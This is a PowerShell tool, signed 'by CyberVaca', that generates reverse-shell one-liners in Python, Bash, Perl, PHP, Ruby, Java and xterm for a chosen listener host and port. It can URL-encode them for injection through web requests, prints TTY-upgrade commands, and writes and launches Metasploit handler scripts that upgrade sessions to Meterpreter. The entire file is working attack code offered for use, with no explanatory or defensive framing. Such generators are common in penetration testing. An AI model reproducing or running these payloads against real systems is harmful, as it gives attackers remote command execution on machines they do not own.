param(
[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$python,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$metasploit

)

$metasploit_perl = @"
use exploit/multi/handler
set payload cmd/unix/reverse_perl
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
use post/multi/manage/shell_to_meterpreter
set LHOST $Lhost
set LPORT 12345
set session 1
"@

$metasploit_python = @"
use exploit/multi/handler
set payload cmd/unix/reverse_python
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
use post/multi/manage/shell_to_meterpreter
set LHOST $Lhost
set LPORT 12345
set session 1
"@


$metasploit_ruby = @"
use exploit/multi/handler
set payload cmd/unix/reverse_ruby
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
use post/multi/manage/shell_to_meterpreter
set LHOST $Lhost
set LPORT 12345
set session 1
"@


$metasploit_java = @"
use exploit/multi/handler
set payload java/shell/reverse_tcp
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
use post/multi/manage/shell_to_meterpreter
set LHOST $Lhost
set LPORT 12345
set session 1
"@

$metasploit_bash = @"
use exploit/multi/handler
set payload cmd/unix/reverse_netcat
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
use post/multi/manage/shell_to_meterpreter
set LHOST $Lhost
set LPORT 12345
set session 1
"@

$metasploit_xterm = @"
use exploit/multi/handler
set payload cmd/unix/generic
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
use post/multi/manage/shell_to_meterpreter
set LHOST $Lhost
set LPORT 12345
set session 1
"@

$metasploit_php = @"
use exploit/multi/handler
set payload php/reverse_php
set LHOST $Lhost
set LPORT $Lport
set ExitOnSession false
exploit -j -z
use post/multi/manage/shell_to_meterpreter
set LHOST $Lhost
set LPORT 12345
set session 1
"@

$banner1 = @"

 ██▀███  ▓█████ ██▒   █▓▓█████  ██▀███    ██████ ▓█████      ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓██ ▒ ██▒▓█   ▀▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓█   ▀    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▓██ ░▄█ ▒▒███   ▓██  █▒░▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒███      ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄      ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░██▓ ▒██▒░▒████▒  ▒▀█░  ░▒████▒░██▓ ▒██▒▒██████▒▒░▒████▒   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
  ░▒ ░ ▒░ ░ ░  ░  ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
  ░░   ░    ░       ░░     ░     ░░   ░ ░  ░  ░     ░      ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░        ░  ░     ░     ░  ░   ░           ░     ░  ░         ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                    ░                                                                              


                                                                             by CyberVaca
"@

Write-Host $banner1 -ForegroundColor red
if ($Lhost -eq "" -or $Lhost -eq "") {

break

}

$r_python = @"
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$Lhost",$Lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"@
$r_bash = @"
bash -i >& /dev/tcp/$Lhost/$Lport 0>&1
"@
$r_perl = @"
perl -e 'use Socket;$`i="$Lhost";`$p=$Lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(`$p,inet_aton(`$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
"@
$r_php = @"
php -r '`$sock=fsockopen("$Lhost",$Lport);exec("/bin/sh -i <&3 >&3 2>&3");'
"@
$r_ruby = @"
ruby -rsocket -e'f=TCPSocket.open("$Lhost",$Lport).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
"@
$r_java = @"
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$Lhost/$Lport;cat <&5 | while read line; do \`$line 2>&5 >&5; done"] as String[])
p.waitFor()
"@
$r_xterm = @"
xterm -display $Lhost":"$Lport
"@


if ($web -eq $true) {

Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Tu shell reversa es : `n`n" -ForegroundColor Green 

if ($python -eq $true) {$r_python = $r_python -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" ;write-host $r_python }
if ($bash -eq $true) {$r_bash = $r_bash  -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_bash }
if ($perl -eq $true) {$_perl = $r_perl   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_perl }
if ($php -eq $true) {$r_php = $r_php   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_php }
if ($ruby -eq $true) {$r_ruby =  $r_ruby   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_ruby }
if ($java -eq $true) {$r_java = $r_java   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_java }
if ($xterm -eq $true) {$r_xterm = $r_xterm   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_xterm }

################################################################################ Spawn tty shell ################################################################################

if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
if ($bash -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "echo os.system('/bin/bash')" }
if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/sh`";'" }
if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/sh`"" }


################################################################################ Metasploit ################################################################################


}

else {

Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Tu shell reversa es : `n`n" -ForegroundColor Green 




if ($python -eq $true) {write-host $r_python "`n"  }
if ($bash -eq $true) {write-host $r_bash "`n" }
if ($perl -eq $true) {write-host $r_perl "`n"}
if ($php -eq $true) {write-host $r_php  "`n"}
if ($ruby -eq $true) {write-host $r_ruby "`n"}
if ($java -eq $true) {write-host $r_java "`n"}
if ($xterm -eq $true) {write-host $r_xterm "`n"}

################################################################################ Spawn tty shell ################################################################################

if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
if ($bash -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "echo os.system('/bin/bash')" }
if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/sh`";'" }
if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/sh`"" }


################################################################################ Metasploit ################################################################################

if ($python -eq $true -and $metasploit -eq $true) {$metasploit_python | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($bash -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($perl -eq $true -and $metasploit -eq $true) {$metasploit_perl | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($ruby -eq $true -and $metasploit -eq $true) {$metasploit_ruby | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($php -eq $true -and $metasploit -eq $true) {$metasploit_php | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($java -eq $true -and $metasploit -eq $true) {$metasploit_java | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
if ($xterm -eq $true -and $metasploit -eq $true) {$metasploit_xterm | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}

}

